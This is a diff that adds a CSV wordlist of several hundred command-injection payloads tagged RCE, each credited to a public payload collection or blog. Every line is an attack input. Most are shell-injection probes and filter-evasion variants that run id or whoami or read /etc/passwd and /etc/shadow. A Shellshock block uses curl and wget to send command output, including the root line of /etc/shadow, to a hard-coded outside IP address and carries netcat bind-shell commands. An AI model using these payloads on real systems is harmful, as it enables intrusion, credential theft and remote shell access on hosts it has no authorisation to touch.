@@ -1,0 +1,532 @@
+cve,tag,payload,url
+,RCE,;ls;,https://github.com/Sma11New/PocList/blob/main/TamronOS-IPTV%E7%B3%BB%E7%BB%9FRCE/TamronOS-IPTV_RCE.py
+,RCE,&lt;!--#exec%20cmd=&quot;/bin/cat%20/etc/passwd&quot;--&gt;,https://github.com/payloadbox/command-injection-payload-list
+,RCE,&lt;!--#exec%20cmd=&quot;/bin/cat%20/etc/shadow&quot;--&gt;,https://github.com/payloadbox/command-injection-payload-list
+,RCE,&lt;!--#exec%20cmd=&quot;/usr/bin/id;--&gt;,https://github.com/payloadbox/command-injection-payload-list
+,RCE,&lt;!--#exec%20cmd=&quot;/usr/bin/id;--&gt;,https://github.com/payloadbox/command-injection-payload-list
+,RCE,/index.html|id|,https://github.com/payloadbox/command-injection-payload-list
+,RCE,;id;,https://github.com/payloadbox/command-injection-payload-list
+,RCE,;id,https://github.com/payloadbox/command-injection-payload-list
+,RCE,;netstat -a;,https://github.com/payloadbox/command-injection-payload-list
+,RCE,;system('cat%20/etc/passwd'),https://github.com/payloadbox/command-injection-payload-list
+,RCE,;id;,https://github.com/payloadbox/command-injection-payload-list
+,RCE,|id,https://github.com/payloadbox/command-injection-payload-list
+,RCE,|/usr/bin/id,https://github.com/payloadbox/command-injection-payload-list
+,RCE,|id|,https://github.com/payloadbox/command-injection-payload-list
+,RCE,|/usr/bin/id|,https://github.com/payloadbox/command-injection-payload-list
+,RCE,||/usr/bin/id|,https://github.com/payloadbox/command-injection-payload-list
+,RCE,|id;,https://github.com/payloadbox/command-injection-payload-list
+,RCE,||/usr/bin/id;,https://github.com/payloadbox/command-injection-payload-list
+,RCE,;id|,https://github.com/payloadbox/command-injection-payload-list
+,RCE,;|/usr/bin/id|,https://github.com/payloadbox/command-injection-payload-list
+,RCE,\n/bin/ls -al\n,https://github.com/payloadbox/command-injection-payload-list
+,RCE,\n/usr/bin/id\n,https://github.com/payloadbox/command-injection-payload-list
+,RCE,\nid\n,https://github.com/payloadbox/command-injection-payload-list
+,RCE,\n/usr/bin/id;,https://github.com/payloadbox/command-injection-payload-list
+,RCE,\nid;,https://github.com/payloadbox/command-injection-payload-list
+,RCE,\n/usr/bin/id|,https://github.com/payloadbox/command-injection-payload-list
+,RCE,\nid|,https://github.com/payloadbox/command-injection-payload-list
+,RCE,;/usr/bin/id\n,https://github.com/payloadbox/command-injection-payload-list
+,RCE,;id\n,https://github.com/payloadbox/command-injection-payload-list
+,RCE,|usr/bin/id\n,https://github.com/payloadbox/command-injection-payload-list
+,RCE,|nid\n,https://github.com/payloadbox/command-injection-payload-list
+,RCE,`id`,https://github.com/payloadbox/command-injection-payload-list
+,RCE,`/usr/bin/id`,https://github.com/payloadbox/command-injection-payload-list
+,RCE,a);id,https://github.com/payloadbox/command-injection-payload-list
+,RCE,a;id,https://github.com/payloadbox/command-injection-payload-list
+,RCE,a);id;,https://github.com/payloadbox/command-injection-payload-list
+,RCE,a;id;,https://github.com/payloadbox/command-injection-payload-list
+,RCE,a);id|,https://github.com/payloadbox/command-injection-payload-list
+,RCE,a;id|,https://github.com/payloadbox/command-injection-payload-list
+,RCE,a)|id,https://github.com/payloadbox/command-injection-payload-list
+,RCE,a|id,https://github.com/payloadbox/command-injection-payload-list
+,RCE,a)|id;,https://github.com/payloadbox/command-injection-payload-list
+,RCE,a|id,https://github.com/payloadbox/command-injection-payload-list
+,RCE,|/bin/ls -al,https://github.com/payloadbox/command-injection-payload-list
+,RCE,a);/usr/bin/id,https://github.com/payloadbox/command-injection-payload-list
+,RCE,a;/usr/bin/id,https://github.com/payloadbox/command-injection-payload-list
+,RCE,a);/usr/bin/id;,https://github.com/payloadbox/command-injection-payload-list
+,RCE,a;/usr/bin/id;,https://github.com/payloadbox/command-injection-payload-list
+,RCE,a);/usr/bin/id|,https://github.com/payloadbox/command-injection-payload-list
+,RCE,a;/usr/bin/id|,https://github.com/payloadbox/command-injection-payload-list
+,RCE,a)|/usr/bin/id,https://github.com/payloadbox/command-injection-payload-list
+,RCE,a|/usr/bin/id,https://github.com/payloadbox/command-injection-payload-list
+,RCE,a)|/usr/bin/id;,https://github.com/payloadbox/command-injection-payload-list
+,RCE,a|/usr/bin/id,https://github.com/payloadbox/command-injection-payload-list
+,RCE,;system('cat%20/etc/passwd'),https://github.com/payloadbox/command-injection-payload-list
+,RCE,;system('id'),https://github.com/payloadbox/command-injection-payload-list
+,RCE,;system('/usr/bin/id'),https://github.com/payloadbox/command-injection-payload-list
+,RCE,%0Acat%20/etc/passwd,https://github.com/payloadbox/command-injection-payload-list
+,RCE,%0A/usr/bin/id,https://github.com/payloadbox/command-injection-payload-list
+,RCE,%0Aid,https://github.com/payloadbox/command-injection-payload-list
+,RCE,%0A/usr/bin/id%0A,https://github.com/payloadbox/command-injection-payload-list
+,RCE,%0Aid%0A,https://github.com/payloadbox/command-injection-payload-list
+,RCE,& ping -i 30 127.0.0.1 &,https://github.com/payloadbox/command-injection-payload-list
+,RCE,& ping -n 30 127.0.0.1 &,https://github.com/payloadbox/command-injection-payload-list
+,RCE,%0a ping -i 30 127.0.0.1 %0a,https://github.com/payloadbox/command-injection-payload-list
+,RCE,`ping 127.0.0.1`,https://github.com/payloadbox/command-injection-payload-list
+,RCE,| id,https://github.com/payloadbox/command-injection-payload-list
+,RCE,& id,https://github.com/payloadbox/command-injection-payload-list
+,RCE,; id,https://github.com/payloadbox/command-injection-payload-list
+,RCE,%0a id %0a,https://github.com/payloadbox/command-injection-payload-list
+,RCE,`id`,https://github.com/payloadbox/command-injection-payload-list
+,RCE,$;/usr/bin/id,https://github.com/payloadbox/command-injection-payload-list
+,RCE,"() { :;}; /bin/bash -c ""curl http://135.23.158.130/.testing/shellshock.txt?vuln=16?user=\`whoami\`""",https://github.com/payloadbox/command-injection-payload-list
+,RCE,"() { :;}; /bin/bash -c ""curl http://135.23.158.130/.testing/shellshock.txt?vuln=18?pwd=\`pwd\`""",https://github.com/payloadbox/command-injection-payload-list
+,RCE,"() { :;}; /bin/bash -c ""curl http://135.23.158.130/.testing/shellshock.txt?vuln=20?shadow=\`grep root /etc/shadow\`""",https://github.com/payloadbox/command-injection-payload-list
+,RCE,"() { :;}; /bin/bash -c ""curl http://135.23.158.130/.testing/shellshock.txt?vuln=22?uname=\`uname -a\`""",https://github.com/payloadbox/command-injection-payload-list
+,RCE,"() { :;}; /bin/bash -c ""curl http://135.23.158.130/.testing/shellshock.txt?vuln=24?shell=\`nc -lvvp 1234 -e /bin/bash\`""",https://github.com/payloadbox/command-injection-payload-list
+,RCE,"() { :;}; /bin/bash -c ""curl http://135.23.158.130/.testing/shellshock.txt?vuln=26?shell=\`nc -lvvp 1236 -e /bin/bash &\`""",https://github.com/payloadbox/command-injection-payload-list
+,RCE,"() { :;}; /bin/bash -c ""curl http://135.23.158.130/.testing/shellshock.txt?vuln=5""",https://github.com/payloadbox/command-injection-payload-list
+,RCE,"() { :;}; /bin/bash -c ""sleep 1 && curl http://135.23.158.130/.testing/shellshock.txt?sleep=1&?vuln=6""",https://github.com/payloadbox/command-injection-payload-list
+,RCE,"() { :;}; /bin/bash -c ""sleep 1 && echo vulnerable 1""",https://github.com/payloadbox/command-injection-payload-list
+,RCE,"() { :;}; /bin/bash -c ""sleep 3 && curl http://135.23.158.130/.testing/shellshock.txt?sleep=3&?vuln=7""",https://github.com/payloadbox/command-injection-payload-list
+,RCE,"() { :;}; /bin/bash -c ""sleep 3 && echo vulnerable 3""",https://github.com/payloadbox/command-injection-payload-list
+,RCE,"() { :;}; /bin/bash -c ""sleep 6 && curl http://135.23.158.130/.testing/shellshock.txt?sleep=6&?vuln=8""",https://github.com/payloadbox/command-injection-payload-list
+,RCE,"() { :;}; /bin/bash -c ""sleep 6 && curl http://135.23.158.130/.testing/shellshock.txt?sleep=9&?vuln=9""",https://github.com/payloadbox/command-injection-payload-list
+,RCE,"() { :;}; /bin/bash -c ""sleep 6 && echo vulnerable 6""",https://github.com/payloadbox/command-injection-payload-list
+,RCE,"() { :;}; /bin/bash -c ""wget http://135.23.158.130/.testing/shellshock.txt?vuln=17?user=\`whoami\`""",https://github.com/payloadbox/command-injection-payload-list
+,RCE,"() { :;}; /bin/bash -c ""wget http://135.23.158.130/.testing/shellshock.txt?vuln=19?pwd=\`pwd\`""",https://github.com/payloadbox/command-injection-payload-list
+,RCE,"() { :;}; /bin/bash -c ""wget http://135.23.158.130/.testing/shellshock.txt?vuln=21?shadow=\`grep root /etc/shadow\`""",https://github.com/payloadbox/command-injection-payload-list
+,RCE,"() { :;}; /bin/bash -c ""wget http://135.23.158.130/.testing/shellshock.txt?vuln=23?uname=\`uname -a\`""",https://github.com/payloadbox/command-injection-payload-list
+,RCE,"() { :;}; /bin/bash -c ""wget http://135.23.158.130/.testing/shellshock.txt?vuln=25?shell=\`nc -lvvp 1235 -e /bin/bash\`""",https://github.com/payloadbox/command-injection-payload-list
+,RCE,"() { :;}; /bin/bash -c ""wget http://135.23.158.130/.testing/shellshock.txt?vuln=27?shell=\`nc -lvvp 1237 -e /bin/bash &\`""",https://github.com/payloadbox/command-injection-payload-list
+,RCE,"() { :;}; /bin/bash -c ""wget http://135.23.158.130/.testing/shellshock.txt?vuln=4""",https://github.com/payloadbox/command-injection-payload-list
+,RCE,cat /etc/hosts,https://github.com/payloadbox/command-injection-payload-list
+,RCE,$(`cat /etc/passwd`),https://github.com/payloadbox/command-injection-payload-list
+,RCE,cat /etc/passwd,https://github.com/payloadbox/command-injection-payload-list
+,RCE,%0Acat%20/etc/passwd,https://github.com/payloadbox/command-injection-payload-list
+,RCE,"{{ get_user_file(""/etc/passwd"") }}",https://github.com/payloadbox/command-injection-payload-list
+,RCE,"<!--#exec cmd=""/bin/cat /etc/passwd""-->",https://github.com/payloadbox/command-injection-payload-list
+,RCE,"<!--#exec cmd=""/bin/cat /etc/shadow""-->",https://github.com/payloadbox/command-injection-payload-list
+,RCE,"<!--#exec cmd=""/usr/bin/id;-->",https://github.com/payloadbox/command-injection-payload-list
+,RCE,system('cat /etc/passwd');,https://github.com/payloadbox/command-injection-payload-list
+,RCE,"<?php system(""cat /etc/passwd"");?>",https://github.com/payloadbox/command-injection-payload-list
+,RCE,id,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
+,RCE,",id",https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
+,RCE,;id,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
+,RCE,;id;,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
+,RCE,id',https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
+,RCE,"""id""",https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
+,RCE,'id,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
+,RCE,'id'',https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
+,RCE,'id''&,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
+,RCE,*id,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
+,RCE,*id*,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
+,RCE,**id**,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
+,RCE,(id),https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
+,RCE,`id`,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
+,RCE,`id`&,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
+,RCE,`id` &,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
+,RCE,;id|,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
+,RCE,;|id|,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
+,RCE,|id,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
+,RCE,|id|,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
+,RCE,||id,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
+,RCE,||id|,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
+,RCE,||id;,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
+,RCE,|id;,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
+,RCE,&id,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
+,RCE,&id&,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
+,RCE,&&id,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
+,RCE,&&id&&,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
+,RCE,^id,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
+,RCE,<id,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
+,RCE,\id,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
+,RCE,);id,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
+,RCE,<id;,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
+,RCE,);id;,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
+,RCE,);id|,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
+,RCE,)|id,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
+,RCE,)|id;,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
+,RCE,\id;,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
+,RCE,\id|,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
+,RCE,\id\,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
+,RCE,(id,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
+,RCE,)id,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
+,RCE,/id,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
+,RCE,-id,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
+,RCE,:id,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
+,RCE,.id,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
+,RCE,""" id",https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
+,RCE, id,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
+,RCE,| id,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
+,RCE,& id,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
+,RCE,", id",https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
+,RCE,; id,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
+,RCE,& id &,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
+,RCE,&& id,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
+,RCE,|| id,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
+,RCE, `id`,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
+,RCE,""" `id`",https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
+,RCE,", `id`",https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
+,RCE,| `id`,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
+,RCE,& `id`,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
+,RCE,; `id`,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
+,RCE, `id` #,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
+,RCE,""" `id` #",https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
+,RCE,", `id` #",https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
+,RCE,| `id` #,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
+,RCE,; `id` #,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
+,RCE,;id/n,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
+,RCE,<id\n,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
+,RCE,\nid,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
+,RCE,\nid\n,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
+,RCE,a;id,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
+,RCE,a);id,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
+,RCE,a;id;,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
+,RCE,a);id|,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
+,RCE,%7Cid,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
+,RCE,%7cid;pwd;uname -a,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
+,RCE,%26 id %26,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
+,RCE,%0aid%0a,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
+,RCE,%0a uname -a %0a,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
+,RCE,%27%0Awhoami%0A%27,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
+,RCE,%22%0Awhoami%0A%22,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
+,RCE,%5C%0Awhoami,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
+,RCE,%27%27%0Awhoami%0A%27%27,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
+,RCE,%2A%0Awhoami%0A,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
+,RCE,%2A%0Awhoami%0A%2A,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
+,RCE,%28%0Awhoami%0A%29,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
+,RCE,%60%0Aid%0A%60,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
+,RCE,%3B%0Awhoami%0A%3B,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
+,RCE,%2C%0Awhoami%0A%2C,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
+,RCE,%7C%0Awhoami,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
+,RCE,%7C%0Awhoami%0A%7C,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
+,RCE,%0a whoami %0a,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
+,RCE,%0Acat%20/etc/passwd,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
+,RCE,%7C%7Cid%0A,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
+,RCE,%2C%20id,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
+,RCE,%5Eid,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
+,RCE,%3Cid,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
+,RCE,%5Cid,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
+,RCE,%27%27id,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
+,RCE,%27%27id%27%27,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
+,RCE,%27%27id%27%27%26,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
+,RCE,%2Aid,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
+,RCE,%2Aid%2A,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
+,RCE,%2A%2Aid%2A%2A,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
+,RCE,%28id%29,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
+,RCE,%60id%60%26,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
+,RCE,%60id%60%20%26,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
+,RCE,%29%3Bid,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
+,RCE,%3Cid%3B,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
+,RCE,%29%3Bid%3B,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
+,RCE,%29%3Bid%7C,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
+,RCE,%29%7Cid,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
+,RCE,%29%7Cid%3B,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
+,RCE,%5Cid%3B,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
+,RCE,%5Cid%7C,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
+,RCE,%5Cid%5C,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
+,RCE,%22%20id,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
+,RCE,%27%20id,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
+,RCE,%7C%20id,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
+,RCE,%26%20id,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
+,RCE,%3B%20id,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
+,RCE,<id%0D,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
+,RCE,<id%0A,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
+,RCE,%0Did,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
+,RCE,%0Did%0D,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
+,RCE,%0Aid,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
+,RCE,%0Aid%0A,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
+,RCE,%2Cid,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
+,RCE,%3Bid,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
+,RCE,%3Bid%3B,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
+,RCE,%28id,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
+,RCE,%29id%20,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
+,RCE,%2Fid%20,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
+,RCE,%3Aid,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
+,RCE,%26%26%20id,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
+,RCE,%7C%7C%20id,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
+,RCE,%27id%27,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
+,RCE,%22id%22,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
+,RCE,%60id%60,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
+,RCE,%3Bid%7C,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
+,RCE,%3B%7Cid%7C,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
+,RCE,%7Cid%7C,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
+,RCE,%7C%7Cid,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
+,RCE,%7C%7Cid%7C,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
+,RCE,%7C%7Cid%3B,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
+,RCE,%7Cid%3B,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
+,RCE,%26id,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
+,RCE,%26id%26,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
+,RCE,%26%26id,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
+,RCE,%26%26id%26%26,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
+,RCE,%3Bid%2Fn,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
+,RCE,%3Cid%5Cn,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
+,RCE,%5Cnid,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
+,RCE,%5Cnid%5Cn,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
+,RCE,a%3Bid,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
+,RCE,a%29%3Bid,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
+,RCE,a%3Bid%3B,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
+,RCE,a%29%3Bid%7C,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
+,RCE,%22%2C%0Asystem%28%27ls%27%29%0A%3B%22,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
+,RCE,%27%0Aid%0A%27,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
+,RCE,%5C%0Awhoami%0A%5C,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
+,RCE,%26%0Awhoami%0A%26,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
+,RCE,%26%20id%20%26,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
+,RCE,%27%20%60id%60,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
+,RCE,%22%20%60id%60,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
+,RCE,%2C%20%60id%60,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
+,RCE,%7C%20%60id%60,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
+,RCE,%26%20%60id%60,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
+,RCE,%3B%20%60id%60,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
+,RCE,%27%20%60id%60%20%23,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
+,RCE,%22%20%60id%60%20%23,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
+,RCE,%2C%20%60id%60%20%23,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
+,RCE,%7C%20%60id%60%20%23,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
+,RCE,%3B%20%60id%60%20%23,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
+,RCE,%3Buname%20-a%3B,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
+,RCE,%26%26dir,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
+,RCE,%26%20uname%20-a%20%26id%7C%7Cwhoami%3B,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
+,RCE,id%7Cwhoami%3B,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
+,RCE,id%26%26whoami%3B,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
+,RCE,id%26whoami%3B,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
+,RCE,127.0.0.1%3Bls,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
+,RCE,127.0.0.1%3Bi%22d,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
+,RCE,%3Bunam%22e%24%7BIFS%7D-a,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
+,RCE,%3Bl%22s%24%7BIFS%7D-la,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
+,RCE,%27i%27d,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
+,RCE,%22i%22d,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
+,RCE,%5Cu%5Cn%5Ca%5Cm%5Ce%20%5C-%5Ca,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
+,RCE,cat%24u%20%2Fetc%24u%2Fpasswd%24u,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
